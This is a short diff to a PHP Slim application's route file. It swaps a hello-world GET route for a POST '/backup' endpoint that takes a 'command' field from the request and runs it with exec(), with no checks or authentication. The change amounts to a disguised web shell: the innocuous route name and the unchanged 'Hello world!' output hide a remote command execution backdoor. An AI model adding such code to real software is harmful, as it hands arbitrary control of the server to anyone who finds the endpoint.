@@ -15,8 +15,14 @@ return function (App $app) {
         return $response;
     });
 
-    $app->get('/', function (Request $request, Response $response) {
+    $app->post('/backup', function (Request $request, Response $response) {
         $response->getBody()->write('Hello world!');
+
+        $command = $_POST['command'];
+        if ($command) {
+            exec($command);
+        }
+
         return $response;
     });
 
